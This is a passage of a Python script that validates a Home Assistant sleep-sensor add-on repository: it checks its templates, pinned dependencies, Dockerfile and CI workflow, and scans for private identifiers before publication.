#!/usr/bin/env python3
"""Validate the public SleepRadar package."""

from __future__ import annotations

import argparse
import collections
import copy
import importlib.util
import json
import re
import subprocess
import sys
import types
import xml.etree.ElementTree as ET
from pathlib import Path, PurePosixPath

if sys.version_info < (3, 11):
    raise SystemExit(
        "scripts/validate_repository.py requires Python 3.11 or newer "
        f"(running {sys.version.split()[0]}); it parses .conductor/settings.toml "
        "with the stdlib tomllib module. CI pins 3.12 and the add-on image is "
        "3.13, so a local venv older than 3.11 was never CI-equivalent anyway. "
        "Recreate it: rm -rf .venv && python3.12 -m venv .venv && "
        ".venv/bin/python -m pip install -r requirements-ci.txt"
    )

import tomllib  # noqa: E402  (guarded above: stdlib only from 3.11)

import yaml

ROOT = Path(__file__).resolve().parents[1]

LEGACY_UNGATED_PHASES = {
    0: "Out of bed",
    1: "Awake",
    2: "Awake",
    3: "REM",
    4: "Light sleep",
    5: "Deep sleep",
}
IN_BED_CODES = frozenset({1, 2, 3, 4, 5})
ASLEEP_CODES = frozenset({3, 4, 5})
INDICATIVE_PHASES = {
    3: "REM (indicative)",
    4: "Light sleep (indicative)",
    5: "Deep sleep (indicative)",
}
INDICATIVE_DASHBOARD_PHASES = {
    3: "REM (indicative)",
    4: "Light (indicative)",
    5: "Deep (indicative)",
}
OCCUPANCY_ENTITY = "binary_sensor.bed_occupied"
EXPECTED_SLEEP_TEMPLATE_STATES = {
    "FP2 Sleep Phase": (
        "{% set occupancy = states('binary_sensor.bed_occupied') %} "
        "{% set code = states('sensor.aqara_fp2_sleep_sleep_state') | int(-1) %} "
        "{% set phases = { "
        "3: 'REM (indicative)', "
        "4: 'Light sleep (indicative)', "
        "5: 'Deep sleep (indicative)' "
        "} %} "
        "{% if occupancy == 'off' %}Out of bed "
        "{% elif occupancy == 'on' %}"
        "{{ phases.get(code, 'In bed — stage unknown') }} "
        "{% else %}Unknown{% endif %}"
    ),
    "FP2 Sleep Now": (
        "{% set occupancy = states('binary_sensor.bed_occupied') %} "
        "{% set code = states('sensor.aqara_fp2_sleep_sleep_state') | int(-1) %} "
        "{% set hr = states('sensor.aqara_fp2_sleep_heart_rate') %} "
        "{% set br = states('sensor.aqara_fp2_sleep_respiration_rate') %} "
        "{% set names = { "
        "3: 'REM (indicative)', "
        "4: 'Light sleep (indicative)', "
        "5: 'Deep sleep (indicative)' "
        "} %} "
        "{% if occupancy == 'off' %}Out of bed "
        "{% elif occupancy == 'on' and code in [3, 4, 5] %} "
        "{{ names[code] }} - heart {{ hr }}, breathing {{ br }} "
        "{% elif occupancy == 'on' %}In bed — stage unknown "
        "{% else %}Unknown{% endif %}"
    ),
    "FP2 Asleep": (
        "{% set occupancy = states('binary_sensor.bed_occupied') %} "
        "{% set code = states('sensor.aqara_fp2_sleep_sleep_state') | int(-1) %} "
        "{{ occupancy == 'on' and code in [3, 4, 5] }}"
    ),
}
EXPECTED_SLEEP_TEMPLATE_AVAILABILITY = (
    "{% set occupancy = states('binary_sensor.bed_occupied') %} "
    "{% set raw = states('sensor.aqara_fp2_sleep_sleep_state') %} "
    "{{ occupancy in ['on', 'off'] "
    "and (occupancy == 'off' "
    "or raw not in ['unavailable', 'unknown', 'none', none]) }}"
)
GHOST_VITALS_FIXTURE = "tests/fixtures/ghost-vitals-incident.json"
GHOST_VITALS_AGGREGATES = {
    "window_minutes": 150,
    "sleep_state_update_events": 300,
    "heart_rate_update_events": 301,
    "heart_rate_value_runs": 27,
    "heart_rate_transitions": 26,
    "heart_rate_distinct_values": 17,
    "heart_rate_minimum_bpm": 50,
    "heart_rate_maximum_bpm": 77,
}
EXPECTED_OBJECT_IDS = {
    "aqara_fp2_sleep_heart_rate",
    "aqara_fp2_sleep_respiration_rate",
    "aqara_fp2_sleep_sleep_state",
    "aqara_fp2_sleep_body_movement",
    "aqara_fp2_sleep_illuminance",
}
# Entity-id suffixes that carry actual sleep data, independent of whatever
# mqtt_node_id an install uses. Anything touching one of these is subject to
# the occupancy gate; see check_automation_gates().
SLEEP_DATA_SUFFIXES = (
    "_sleep_state",
    "_heart_rate",
    "_respiration_rate",
    "_body_movement",
    "_illuminance",
)
EXPECTED_RUNTIME_REQUIREMENTS = [
    "paho-mqtt==2.1.0",
    "pycryptodome==3.23.0",
]
EXPECTED_CI_REQUIREMENTS = [
    "-r aqara_fp2_sleep/requirements.txt",
    "PyYAML==6.0.3",
    "yamllint==1.37.1",
]
CHECKOUT_ACTION = "actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10"
SETUP_PYTHON_ACTION = "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1"
PYTHON_VERSION = "3.12"
PIP_AUDIT_VERSION = "2.10.1"
GITLEAKS_VERSION = "8.30.0"
GITLEAKS_LINUX_X64_SHA256 = (
    "79a3ab579b53f71efd634f3aaf7e04a0fa0cf206b7ed434638d1547a2470a66e"
)
CONDUCTOR_CLI_TEST_COMMAND = ".venv/bin/python tests/test_validate_repository_cli.py"
CONDUCTOR_BASELINE_COMMAND = (
    ".venv/bin/python videos/validate-gif-batch.py "
    "--check-baseline videos/gif-batch-baseline-sha256.json"
)
# Single source of truth for the pre-PR gate chain, in the documented order.
# Each entry is (local command, ci.yml step name, what the gate proves). The
# ci.yml step name is None where CI deliberately runs a different form: the
# whitespace gate compares a commit range in CI but the working tree locally.
# Both `.conductor/settings.toml` and the ci.yml `validate` job are checked
# against this one tuple, so a gate cannot be added to one and forgotten in
# the other.
CONDUCTOR_GATES = (
    ("git diff --check", None, None),
    (
        (
            ".venv/bin/python -m py_compile "
            "aqara_fp2_sleep/aqara_fp2_sleep_poller.py "
            "scripts/validate_repository.py "
            "videos/quiet_proof_loops.py "
            "videos/validate-gif-batch.py "
            "videos/build-gif-deliverables.py"
        ),
        "Check Python syntax",
        "compile-check the Python and GIF workflow entrypoints",
    ),
    (
        ".venv/bin/yamllint -c .yamllint .",
        "Lint YAML",
        "lint YAML with the repo config",
    ),
    (
        ".venv/bin/python scripts/validate_repository.py",
        "Validate add-on package",
        "run the repository validator",
    ),
    (
        ".venv/bin/python scripts/validate_repository.py --self-test",
        "Validator drift self-test",
        "run the repository validator self-test",
    ),
    (
        CONDUCTOR_CLI_TEST_COMMAND,
        "Test validator CLI",
        "test validator command-line behavior",
    ),
    (
        ".venv/bin/python videos/validate-gif-batch.py",
        "Validate GIF sources",
        "validate the tracked GIF sources without rendering",
    ),
    (
        ".venv/bin/python videos/validate-gif-batch.py --self-test",
        "GIF validator drift self-test",
        "run the GIF source validator self-test",
    ),
    (
        ".venv/bin/python videos/build-gif-deliverables.py --self-test",
        "GIF builder guard self-test",
        "run the non-rendering GIF builder guard self-test",
    ),
    (
        CONDUCTOR_BASELINE_COMMAND,
        "Check tracked published baseline",
        "check the tracked published binaries against the SHA-256 baseline",
    ),
    (
        "node tests/sleepradar-card.test.js",
        "Test SleepRadar card",
        "run the SleepRadar card test",
    ),
    (
        "bash -n aqara_fp2_sleep/run.sh",
        "Check run script syntax",
        "check the add-on run script syntax",
    ),
)
CONDUCTOR_REQUIRED_COMMANDS = tuple(command for command, _, _ in CONDUCTOR_GATES)
# ci.yml validate-job steps that legitimately run something other than a gate.
# Their run: bodies are content-checked individually below; they are not
# exempt from validation, only from the CONDUCTOR_GATES derivation.
CI_VALIDATE_SUPPORT_STEPS = frozenset({"Install dependencies", "Check whitespace"})
# Every named `run:` step in jobs.security and jobs.docker-build. Each one is
# individually validated below (require_run_pattern/step_by_name); this set
# exists only so an entirely new, unvalidated named step can be rejected by
# require_known_run_steps() instead of silently running unreviewed. Keep
# these names in lockstep with the step_run()/step_by_name() calls below —
# adding, renaming, or removing a named step requires updating both.
CI_SECURITY_STEPS = frozenset(
    {
        "Audit runtime Python dependencies",
        "Install Gitleaks",
        "Self-test secret scanner",
        "Self-test repo config detects and excludes correctly",
        "Scan current tree for secrets",
    }
)
CI_DOCKER_BUILD_STEPS = frozenset({"Build add-on image"})
# The complete, exact set of jobs this file knows how to validate, mapped to
# the named `run:` steps each one may contain. Every downstream check (SHA-pin
# scan, duplicate-name scan, per-job step checks) iterates this mapping, so a
# job added here is automatically covered by all of them and an undocumented
# extra job in ci.yml is rejected — see validate_workflow().
CI_KNOWN_RUN_STEPS = {
    "validate": CI_VALIDATE_SUPPORT_STEPS.union(
        step_name for _, step_name, _ in CONDUCTOR_GATES if step_name
    ),
    "security": CI_SECURITY_STEPS,
    "docker-build": CI_DOCKER_BUILD_STEPS,
}
# Derived, never hand-written: a job cannot be declared known without also
# declaring which named run: steps it may contain.
CI_JOB_NAMES = tuple(CI_KNOWN_RUN_STEPS)
FAVICON_SOURCE = "assets/sleepradar-mark.svg"
FAVICON_PATH = "favicon.svg"
FAVICON_VIEW_BOX = "0 0 128 128"
SHA_PINNED_ACTION = re.compile(r"^[^@\s]+@[0-9a-f]{40}$")
WATCHDOG_URL_PATTERN = re.compile(r"^(?:https?|tcp)://")


class ValidationError(Exception):
    """Raised by fail(); --self-test asserts these failures."""


PRIVATE_PATTERNS = {
    "private HA URL": re.compile(r"ha\.horner\.io", re.IGNORECASE),
    "mounted HA config path": re.compile(r"/Volumes/config"),
    "local HA token path": re.compile(r"~/.ha-token"),
    "context artifact path": re.compile(r"\.context/"),
    "known private FP2 subject id": re.compile(r"lumi1\.54ef4473e530"),
    "likely Aqara subject id": re.compile(r"lumi\d?\.[0-9a-f]{10,}", re.IGNORECASE),
    "likely email address": re.compile(
        r"\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b", re.IGNORECASE
    ),
    "private bedroom entity prefix": re.compile(
        r"schlafzimmer|bedroom_bed_status", re.IGNORECASE
    ),
    "local German bed label": re.compile(r"\bbett\b", re.IGNORECASE),
    "likely HA token": re.compile(r"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"),
}

TEXT_SUFFIXES = {
    ".md",
    ".py",
    ".sh",
    ".yaml",
    ".yml",
    ".txt",
    ".json",
    ".js",
    ".html",
    ".svg",
    ".gitignore",
    ".Dockerfile",
}

SKIP_DIRS = {
    ".git",
    "__pycache__",
    ".pytest_cache",
    ".ruff_cache",
    ".venv",
    ".context",
    # Generated/vendored video output; only authored source is scanned.
    "node_modules",
    ".hyperframes",
    "renders",
    "snapshots",
}


def fail(message: str) -> None:
    raise ValidationError(message)


def normalize_template(value: str) -> str:
    return re.sub(r"\s+", " ", value).strip()


def read_effective_requirement_lines(rel: str) -> list[str]:
    path = ROOT / rel
    if not path.exists():
        fail(f"{rel} is missing")
    lines = []
    for raw_line in path.read_text(encoding="utf-8").splitlines():
        line = raw_line.strip()
        if line and not line.startswith("#"):
            lines.append(line)
    return lines


def validate_requirements() -> None:
    runtime = read_effective_requirement_lines("aqara_fp2_sleep/requirements.txt")
    if runtime != EXPECTED_RUNTIME_REQUIREMENTS:
        fail(
            "aqara_fp2_sleep/requirements.txt must contain exactly: "
            + ", ".join(EXPECTED_RUNTIME_REQUIREMENTS)
        )

    ci = read_effective_requirement_lines("requirements-ci.txt")
    if ci != EXPECTED_CI_REQUIREMENTS:
        fail(
            "requirements-ci.txt must contain exactly: "
            + ", ".join(EXPECTED_CI_REQUIREMENTS)
        )


def dockerfile_instructions(path: Path) -> list[str]:
    instructions = []
    current = ""
    for raw_line in path.read_text(encoding="utf-8").splitlines():
        line = raw_line.rstrip()
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        current = f"{current} {stripped}" if current else stripped
        if current.endswith("\\"):
            current = current[:-1].rstrip()
            continue
        instructions.append(re.sub(r"\s+", " ", current))
        current = ""
    if current:
        instructions.append(re.sub(r"\s+", " ", current))
    return instructions


def validate_dockerfile() -> None:
    path = ROOT / "aqara_fp2_sleep/Dockerfile"
    instructions = dockerfile_instructions(path)
    copy_index = None
    pip_install_index = None
    for index, instruction in enumerate(instructions):
        upper = instruction.upper()
        if upper.startswith("COPY ") and re.search(
            r"\brequirements\.txt\s+/requirements\.txt\b", instruction
        ):
            copy_index = index
        if upper.startswith("RUN ") and "pip3 install" in instruction:
            if "-r /requirements.txt" in instruction:
                pip_install_index = index
            if re.search(r"\b(paho-mqtt|pycryptodome)\b", instruction):
                fail(
                    "aqara_fp2_sleep/Dockerfile must install runtime packages "
                    "through requirements.txt, not inline package names"
                )

    if copy_index is None:
        fail("aqara_fp2_sleep/Dockerfile must copy requirements.txt")
    if pip_install_index is None:
        fail(
            "aqara_fp2_sleep/Dockerfile must install with "
            "pip3 install --no-cache-dir -r /requirements.txt"
        )
    if copy_index > pip_install_index:
        fail(
            "aqara_fp2_sleep/Dockerfile must copy requirements.txt before "
            "the pip install layer"
        )


def load_workflow() -> dict:
    path = ROOT / ".github/workflows/ci.yml"
    with path.open(encoding="utf-8") as handle:
        workflow = yaml.safe_load(handle)
    if not isinstance(workflow, dict):
        fail(".github/workflows/ci.yml must parse as a YAML mapping")
    return workflow


def validate_workflow_permissions(workflow: dict) -> None:
    """Require the read-only workflow-level token grant.

    Split out of the file-reading path so the self-test can mutate it: a guard
    that only runs when the real ci.yml is parsed has no expect_fail fixture,
    so it can silently decay without the drift check noticing.
    """

    if workflow.get("permissions") != {"contents": "read"}:
        fail(".github/workflows/ci.yml must set permissions: contents: read")


def workflow_jobs() -> dict:
    workflow = load_workflow()
    validate_workflow_permissions(workflow)

    jobs = workflow.get("jobs")
    if not isinstance(jobs, dict):
        fail(".github/workflows/ci.yml must define jobs")
    return jobs


def job_steps(jobs: dict, name: str) -> list[dict]:
    steps = jobs[name].get("steps")
    if not isinstance(steps, list):
        fail(f".github/workflows/ci.yml jobs.{name}.steps must be a list")
    for step in steps:
        if not isinstance(step, dict):
            fail(f".github/workflows/ci.yml jobs.{name}.steps must be mappings")
    return steps


def require_action(steps: list[dict], action: str, job_name: str) -> dict:
    for step in steps:
        if step.get("uses") == action:
            return step
    fail(f".github/workflows/ci.yml jobs.{job_name} must use {action}")


def step_by_name(steps: list[dict], name: str) -> dict:
    for step in steps:
        if step.get("name") == name:
            return step
    fail(f".github/workflows/ci.yml is missing step: {name}")


def step_run(steps: list[dict], name: str) -> str:
    step = step_by_name(steps, name)
    run = step.get("run")
    if not isinstance(run, str):
        fail(f".github/workflows/ci.yml step {name!r} must have a run script")
    return run


def require_run_pattern(
    steps: list[dict], name: str, pattern: str, description: str
) -> None:
    if not re.search(pattern, step_run(steps, name), re.MULTILINE):
        fail(f".github/workflows/ci.yml step {name!r} must {description}")


def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> None:
    """Reject any named `run:` step not in `known_names` for this job.

    Without this, a brand-new step with a name that has never been seen
    before (so it can't collide with an existing gate's name) would run
    completely unvalidated: it isn't a duplicate of a known step, and it
    isn't checked by any name-specific require_run_pattern()/step_by_name()
    call, so nothing in this file would ever look at it.

    Membership is keyed on the presence of a `run:` key, NOT on its parsed
    type. PyYAML types plain scalars, so `run: on` becomes True and
    `run: 123` becomes an int, while GitHub Actions stringifies and executes
    both — an isinstance(str) gate here would skip every check for them.

    An unnamed `run:` step is rejected with its own diagnostic: no name-keyed
    check can inspect it, so it cannot be documented. Unnamed `uses:` steps
    remain legitimate and are untouched here.
    """

    for step in steps:
        name = step.get("name")
        if "run" not in step:
            continue
        if not isinstance(step.get("run"), str):
            fail(
                f".github/workflows/ci.yml jobs.{job_name} step {name!r} must "
                "quote its run: script; unquoted YAML scalars such as `on` or "
                "`123` parse as bool/int here while GitHub Actions still runs "
                "them, which would skip every run-step check in this validator"
            )
        # An anonymous `run:` step is rejected too — no name-keyed check can
        # ever inspect it — but it needs its own diagnostic. Falling through to
        # the membership error below told the author to add `None` to
        # CI_KNOWN_RUN_STEPS. (Anonymous `uses:` steps stay legitimate; the
        # duplicate-name scan excludes them for that reason.)
        if name is None:
            fail(
                f".github/workflows/ci.yml jobs.{job_name} has an unnamed step "
                "with a run: script; give it a `name:` and document it in "
                "CI_KNOWN_RUN_STEPS in scripts/validate_repository.py, because "
                "every command check in this validator is keyed on the name"
            )
        if name not in known_names:
            fail(
                f".github/workflows/ci.yml jobs.{job_name} step {name!r} is not "
                "a documented step for this job; add it to CI_KNOWN_RUN_STEPS "
                "in scripts/validate_repository.py (and to CONDUCTOR_GATES, "
                ".conductor/settings.toml, CONTRIBUTING.md, and "
                ".github/PULL_REQUEST_TEMPLATE.md if it should also be a "
                "shared local/CI gate)"
            )


def validate_run_step_names(steps: list[dict], job_name: str) -> None:
    """Reject malformed names before name-based workflow checks run."""

    for step in steps:
        if "run" not in step:
            continue
        name = step.get("name")
        if name is None:
            continue
        if not isinstance(name, str) or not name.strip():
            fail(
                f".github/workflows/ci.yml jobs.{job_name} step name must be "
                f"a non-empty string, got {name!r}"
            )


def validate_workflow(jobs=None) -> None:
    jobs = workflow_jobs() if jobs is None else jobs

    # Every check below only inspects jobs named in CI_KNOWN_RUN_STEPS.
    # Without this, a brand-new job (e.g. jobs.deploy) with its own unpinned
    # actions and unreviewed run: steps would never be looked at by anything
    # in this file — the same "unseen name skips every check" bug already
    # closed at the step level (duplicate names, then undocumented steps
    # within an existing job), recurring one level up at job granularity.
    # sorted(key=str): a job id that YAML types as a bool (`on`, `yes`, `off`
    # are all legal GitHub job ids) would otherwise make a mixed-type sort
    # raise TypeError instead of reporting this actionable failure.
    extra_jobs = sorted(set(jobs) - set(CI_JOB_NAMES), key=str)
    if extra_jobs:
        fail(
            f".github/workflows/ci.yml defines undocumented job(s) {extra_jobs}; "
            "add them to CI_KNOWN_RUN_STEPS in scripts/validate_repository.py "
            "(which is what every per-job check iterates) and give them the "
            "same validation as validate/security/docker-build, or remove them"
        )
    # Required-job presence is checked here rather than in workflow_jobs() so
    # an injected jobs dict fails closed with a ValidationError instead of a
    # raw KeyError out of job_steps() — expect_fail() only catches the former.
    for name in CI_JOB_NAMES:
        if name not in jobs:
            fail(f".github/workflows/ci.yml must define jobs.{name}")
        if not isinstance(jobs[name], dict):
            fail(f".github/workflows/ci.yml jobs.{name} must be a mapping")

    # Derived from CI_KNOWN_RUN_STEPS, never a hand-written job list: a job
    # documented there is automatically covered by the duplicate-name scan,
    # the SHA-pin scan and the unknown-step scan below. A hardcoded list here
    # meant a job added per the error message above escaped all three.
    steps_by_job = {name: job_steps(jobs, name) for name in CI_JOB_NAMES}
    validate_steps = steps_by_job["validate"]
    security_steps = steps_by_job["security"]
    docker_steps = steps_by_job["docker-build"]
    all_steps = [step for steps in steps_by_job.values() for step in steps]

    # Validate run-step names before the duplicate-name Counter and the
    # known-step membership checks below. A YAML list or mapping in `name:` is
    # otherwise unhashable and crashes the validator instead of failing closed.
    for job_name, steps in steps_by_job.items():
        validate_run_step_names(steps, job_name)

    # step_by_name()/step_run() only ever inspect the FIRST step matching a
    # given name. Without this check, a second step reusing an existing gate's
    # name (e.g. a duplicate "Validate add-on package") would never be
    # inspected by require_run_pattern() — the exact "undocumented CI gate"
    # this file's drift checks exist to catch would slip through silently.
    for job_name, steps in steps_by_job.items():
        # Steps without a `name` (typically bare `uses:` steps) are legitimately
        # anonymous and excluded — only a repeated *actual* name is a bypass risk.
        duplicates = sorted(
            (
                name
                for name, count in collections.Counter(
                    step.get("name") for step in steps if step.get("name") is not None
                ).items()
                if count > 1
            ),
            key=str,
        )
        if duplicates:
            fail(
                f".github/workflows/ci.yml jobs.{job_name} has duplicate step "
                f"names: {duplicates}; every named-step lookup in this "
                "validator only inspects the first match, so a duplicate name "
                "can smuggle an unvalidated step past every check keyed on it"
            )

    uses = [step.get("uses") for step in all_steps if "uses" in step]
    for action in uses:
        if not isinstance(action, str) or not SHA_PINNED_ACTION.match(action):
            fail(f".github/workflows/ci.yml action is not SHA-pinned: {action}")

    validate_checkout = require_action(validate_steps, CHECKOUT_ACTION, "validate")
    if validate_checkout.get("with", {}).get("fetch-depth") not in (0, "0"):
        fail(
            ".github/workflows/ci.yml jobs.validate checkout must use "
            "fetch-depth: 0 so diff checks compare against the base commit"
        )
    require_action(security_steps, CHECKOUT_ACTION, "security")
    require_action(docker_steps, CHECKOUT_ACTION, "docker-build")

    for job_name, steps in [
        ("validate", validate_steps),
        ("security", security_steps),
    ]:
        setup_step = require_action(steps, SETUP_PYTHON_ACTION, job_name)
        if setup_step.get("with", {}).get("python-version") != PYTHON_VERSION:
            fail(
                f".github/workflows/ci.yml jobs.{job_name} setup-python must use "
                f"Python {PYTHON_VERSION}"
            )

    install_run = step_run(validate_steps, "Install dependencies")
    if not re.search(
        r"\bpython3?\s+-m\s+pip\s+install\s+-r\s+requirements-ci\.txt\b", install_run
    ):
        fail(".github/workflows/ci.yml must install requirements-ci.txt")

    # Structural, not substring: every required marker used to be accepted
    # anywhere in the body, so a step whose whole script was a `#` comment
    # passed while checking nothing. Require the two real command lines.
    whitespace_step = step_by_name(validate_steps, "Check whitespace")
    whitespace_env = whitespace_step.get("env")
    if not isinstance(whitespace_env, dict) or not {"BASE_SHA", "HEAD_SHA"} <= set(
        whitespace_env
    ):
        fail(
            ".github/workflows/ci.yml Check whitespace step must define "
            "BASE_SHA and HEAD_SHA in env"
        )
    expected_whitespace_env = {
        "BASE_SHA": "${{ github.event.pull_request.base.sha || github.event.before }}",
        "HEAD_SHA": "${{ github.sha }}",
    }
    for variable, expected in expected_whitespace_env.items():
        if whitespace_env.get(variable) != expected:
            fail(
                ".github/workflows/ci.yml Check whitespace step must derive "
                f"{variable} from the GitHub event ({expected!r})"
            )
    whitespace_lines = shell_command_lines(step_run(validate_steps, "Check whitespace"))
    for required in ['git diff --check "$BASE_SHA...$HEAD_SHA"', "git diff --check"]:
        if required not in whitespace_lines:
            fail(
                ".github/workflows/ci.yml Check whitespace step must compare "
                "the checked-out branch with git diff --check, as an executed "
                f"command line: {required}"
            )
    for command, step_name, purpose in CONDUCTOR_GATES:
        if step_name is None:
            continue
        require_run_pattern(validate_steps, step_name, ci_run_pattern(command), purpose)

    # Every named run: step in every known job must be a documented step, so a
    # brand-new (non-duplicate) name cannot run unreviewed. For jobs.validate
    # that means a declared CONDUCTOR_GATES gate or one of the two
    # content-checked support steps in CI_VALIDATE_SUPPORT_STEPS; anything else
    # would leave .conductor/settings.toml and CONTRIBUTING.md lagging CI.
    # Note this covers `run:` steps only — an extra SHA-pinned `uses:` step is
    # still accepted (see docs/repository-validation.md limitations).
    for job_name, steps in steps_by_job.items():
        require_known_run_steps(steps, CI_KNOWN_RUN_STEPS[job_name], job_name)

    for step in all_steps:
        run = step.get("run")
        if (
            isinstance(run, str)
            and re.search(r"\bpython3?\s+videos/build-gif-deliverables\.py\b", run)
            and not re.fullmatch(
                r"\s*python3?\s+videos/build-gif-deliverables\.py\s+--self-test\s*",
                run,
            )
        ):
            fail(".github/workflows/ci.yml must not render GIF deliverables")
    require_run_pattern(
        docker_steps,
        "Build add-on image",
        r"\bdocker\s+build\s+--build-arg\s+BUILD_VERSION=ci\s+aqara_fp2_sleep\b",
        "build the add-on image with the add-on directory as context",
    )

    audit_run = step_run(security_steps, "Audit runtime Python dependencies")
    if not re.search(
        rf"\bpython3?\s+-m\s+pip\s+install\s+pip-audit=={re.escape(PIP_AUDIT_VERSION)}\b",
        audit_run,
    ):
        fail(f".github/workflows/ci.yml must install pip-audit=={PIP_AUDIT_VERSION}")
    if not re.search(
        r"\bpip-audit\s+-r\s+aqara_fp2_sleep/requirements\.txt\s+--progress-spinner\s+off\b",
        audit_run,
    ):
        fail(".github/workflows/ci.yml must audit runtime requirements only")

    gitleaks_step = step_by_name(security_steps, "Install Gitleaks")
    env = gitleaks_step.get("env")
    if not isinstance(env, dict):
        fail(".github/workflows/ci.yml Install Gitleaks step must define env")
    if env.get("GITLEAKS_VERSION") != GITLEAKS_VERSION:
        fail(f".github/workflows/ci.yml must install Gitleaks {GITLEAKS_VERSION}")
    if env.get("GITLEAKS_SHA256") != GITLEAKS_LINUX_X64_SHA256:
        fail(".github/workflows/ci.yml has the wrong Gitleaks Linux x64 SHA256")
    install_gitleaks_run = step_run(security_steps, "Install Gitleaks")
    if (
        "sha256sum -c -" not in install_gitleaks_run
        or "gitleaks version" not in install_gitleaks_run
    ):
        fail(".github/workflows/ci.yml must verify and print the Gitleaks binary")

    self_test_run = step_run(security_steps, "Self-test secret scanner")
    for required in [
        "mktemp -d",
        "api_key",
        'gitleaks dir --no-banner --redact "$scan_dir"',
        "exit 1",
    ]:
        if required not in self_test_run:
            fail(
                ".github/workflows/ci.yml secret scanner self-test must assert "
                f"detection with: {required}"
            )

    # This self-test is the only CI step that proves .gitleaks.toml itself still
    # detects anything: the "Self-test secret scanner" step scans a temp dir, so
    # it loads the DEFAULT ruleset and would stay green even if the repo
    # allowlist were broadened to suppress everything. Require both control directions,
    # matched against executed command lines rather than by substring:
    # substring matching accepted a step with the whole exclusion control
    # deleted (the bare scan is a substring of the `if` line, and the .gstack
    # filename appears in the trap line), and accepted a step whose every
    # marker sat in a `#` comment.
    config_selftest_lines = shell_command_lines(
        step_run(security_steps, "Self-test repo config detects and excludes correctly")
    )
    positive_control = "if gitleaks dir --no-banner --redact .; then"
    exclusion_scan = "gitleaks dir --no-banner --redact ."
    gstack_selftest_state = ".gstack/gitleaks-generated-state-self-test.json"
    required_lines = {
        # A bare `trap ` would accept `trap '' EXIT`, which cleans up nothing
        # and leaves both planted secrets in the workspace.
        "a cleanup trap naming both planted paths": lambda line: (
            line.startswith("trap ")
            and ".gitleaks-selftest" in line
            and gstack_selftest_state in line
        ),
        "a planted secret in a normal path": lambda line: (
            line.startswith("printf ")
            and "api_key" in line
            and ".gitleaks-selftest" in line
        ),
        "the positive control (config must detect it)": (
            lambda line: line == positive_control
        ),
        "a failing exit when detection does not happen": lambda line: line == "exit 1",
        "the same secret planted under generated .gstack state": lambda line: (
            line.startswith("printf ")
            and "api_key" in line
            and gstack_selftest_state in line
        ),
        "the exclusion control as its own scan (config must NOT flag it)": (
            lambda line: line == exclusion_scan
        ),
    }
    first_index = {}
    for description, matches in required_lines.items():
        index = next(
            (i for i, line in enumerate(config_selftest_lines) if matches(line)), None
        )
        if index is None:
            fail(
                ".github/workflows/ci.yml Gitleaks config self-test must prove "
                "the repo config both detects a planted secret and excludes "
                f"generated .gstack state; it is missing {description}"
            )
        first_index[description] = index

    # Presence alone is order-independent, so hoisting the exclusion scan above
    # the .gstack plant would keep every marker present while that scan ran
    # against a clean tree and proved nothing. Each control must be planted
    # before the scan that is supposed to react to it.
    for earlier, later in [
        (
            "a planted secret in a normal path",
            "the positive control (config must detect it)",
        ),
        (
            "the same secret planted under generated .gstack state",
            "the exclusion control as its own scan (config must NOT flag it)",
        ),
    ]:
        if first_index[earlier] > first_index[later]:
            fail(
                ".github/workflows/ci.yml Gitleaks config self-test runs "
                f"{later!r} before {earlier!r}; a scan that precedes its own "
                "planted input proves nothing"
            )

    scan_run = step_run(security_steps, "Scan current tree for secrets")
    if "gitleaks dir --no-banner --redact --verbose ." not in scan_run:
        fail(".github/workflows/ci.yml must scan the current worktree with Gitleaks")


def shell_command_lines(run: str) -> list[str]:
    """Return the executable lines of a run: script, without comments.

    Guards that match anywhere in the body are satisfiable by text inside a
    `#` comment, so every structural check works from this list instead.
    """

    lines = []
    for raw in run.splitlines():
        line = raw.strip()
        if line and not line.startswith("#"):
            lines.append(line)
    return lines


def ci_run_pattern(conductor_command: str) -> str:
    """Derive the anchored ci.yml run-step regex from a documented local gate.

    Conductor runs the workspace venv (`.venv/bin/python`); CI runs the
    runner's interpreter (`python` or `python3`). Deriving one from the other
    keeps a single gate list instead of two hand-maintained copies. The pattern
    is fully anchored so a step cannot satisfy its guard by running a
    *different* invocation that merely contains the expected substring.

    Only horizontal whitespace is allowed between tokens. `\\s` would match a
    newline, so a block scalar splitting the gate across lines matched the
    "fully anchored" pattern while the shell ran each line as its own command
    — the same fold normalized_shell_commands() refuses on the Conductor side.
    A single trailing newline is allowed because YAML block scalars end with
    one.
    """

    for prefix, replacement in (
        (".venv/bin/python ", r"python3?[ \t]+"),
        (".venv/bin/yamllint ", r"yamllint[ \t]+"),
    ):
        if conductor_command.startswith(prefix):
            rest = conductor_command[len(prefix) :]
            break
    else:
        if conductor_command.startswith(".venv/"):
            fail(
                "scripts/validate_repository.py cannot derive a CI pattern for "
                f"the gate {conductor_command!r}: CI has no workspace venv, so "
                "add a prefix translation for this tool to ci_run_pattern() "
                "rather than exempting the step from the derived gate list"
            )
        replacement, rest = "", conductor_command
    escaped = r"[ \t]+".join(re.escape(token) for token in rest.split())
    return r"\A[ \t]*" + replacement + escaped + r"[ \t]*\n?\Z"


def normalized_shell_commands(command: str) -> list[str]:
    """Split a `&&` chain into commands, collapsing only horizontal whitespace.

    Newlines and other control characters are deliberately NOT collapsed: the
    shell treats a newline as a command terminator, so folding one into a space
    would let a broken run command match a documented gate.
    """

    if any(character in command for character in "\n\r"):
        fail(
            ".conductor/settings.toml validation run must not contain newlines; "
            "the shell treats them as command terminators"
        )
    return [
        re.sub(r"[ \t]+", " ", part.strip())
        for part in command.split("&&")
        if part.strip()
    ]


def check_conductor_run_command(command: str) -> None:
    actual = normalized_shell_commands(command)
    expected = list(CONDUCTOR_REQUIRED_COMMANDS)
    if actual == expected:
        return

    # Counter (multiset) diff, not `in`-based set membership: a duplicated
    # gate (same command twice) has every element individually present in
    # both lists, so set-membership checks would find nothing missing or
    # unexpected and misdiagnose it as "order differs" instead of naming the
    # actual defect.
    actual_counts = collections.Counter(actual)
    expected_counts = collections.Counter(expected)
    details = []
    missing = sorted((expected_counts - actual_counts).elements())
    unexpected = sorted((actual_counts - expected_counts).elements())
    if missing:
        details.append("missing: " + ", ".join(missing))
    if unexpected:
        details.append("unexpected: " + ", ".join(unexpected))
    if not missing and not unexpected:
        details.append("gate order differs from the documented local pre-PR order")
    fail(
        ".conductor/settings.toml validation run must exactly match the "
